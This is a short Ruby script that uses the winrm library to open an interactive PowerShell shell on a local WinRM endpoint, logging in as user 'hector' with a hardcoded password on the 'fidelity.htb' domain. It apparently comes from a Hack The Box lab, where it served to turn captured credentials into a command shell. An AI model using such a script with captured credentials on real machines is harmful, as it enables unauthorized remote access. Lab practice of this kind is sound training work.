require 'winrm'
        
        conn = WinRM::Connection.new(
        endpoint: 'http://127.0.0.1:5985/wsman',
        user: 'hector',
        password: 'l33th4x0rhector',
        domain: 'fidelity.htb'	
        )

        command=""

        conn.shell(:powershell) do |shell|
        until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
